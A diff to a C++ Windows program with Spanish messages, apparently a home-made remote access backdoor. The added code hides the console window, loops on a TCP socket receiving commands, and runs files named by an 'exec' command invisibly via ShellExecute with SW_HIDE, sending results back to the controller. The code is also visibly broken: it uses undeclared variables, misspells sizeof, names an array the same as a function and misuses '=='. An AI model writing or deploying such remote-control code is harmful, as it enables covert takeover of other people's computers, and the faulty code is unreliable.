@@ -5,6 +5,13 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
+void exec(char * ansVal, int ansLong, char *file){
+	if(32 >= (int)(ShellExecute(NULL,"open",file, NULL, NULL, SW_HIDE)))
+		strcat(ansVal, "[-] Error al ejecutar el comando\n");
+	else
+		strcat(ansVal,"\n");	
+}
+
 void HideCmdWindowsWithoutFlash(){
 	HWND hide = FindWindowA("ConsoleWindowClass",NULL); //check
 	AllocConsole(); //check
@@ -37,12 +44,48 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 		printf("Error al conectar\n");
 	}
 	else{
-		printf("Conexion establecida\n");
-		char Received[1024] = "";
-		int Result = recv(socketS,Received,1024,0);
-		printf("Received: %s",Received);
-		printf("Longitud: %d",Result);
-		getchar();
+		while(true){
+			printf("Conexion establecida\n");
+			char Received[1024] = "";
+			int Result = recv(socketS,Received,1024,0);
+		//printf("Received: %s",Received);
+		//printf("Longitud: %d",Result);
+		//getchar();
+			if((strcmp(Received, "exit")==0)){
+				closesocket(tcpsock);
+				WSACleanup();
+				exit(0);
+			}	
+			else{
+				char valSend[1024] = "";
+				for(int i = 0; i < (*(&Received + 1) - Received); ++i){
+					if(Received[i] == *" ")
+						break;
+					else
+						valSend[i]=Received[i];
+				}
+				if(strcmp(valSend,"exec") ==0){
+					char exec[1024] = "";
+					int j = 0;
+					for(int i=5;i<(*(&Received + 1) - Received); ++i){
+						exec[j] = Received[i];
+						++j;
+					}
+					char buff[250] = "";
+					exec(buff,250, exec);
+					strcat(buffer,"\n");
+					send(socketS, buff, strlen(buff) + 1, 0);
+					memset(buff,0,sizeof(buff));
+					memset(Received, 0, sizeoff(Received));
+				}
+				else{
+					char buff[25] == "[-]Comando no reconocido\n";
+					send(socketS, buff, strlen(buffer)+1,0);
+					memset(buffer, 0, sizeof(buffer));
+					memset(Received,0,sizeof(Received));
+				}
+			}
+		}
 	}
 	closesocket(socketS);
 	WSACleanup();
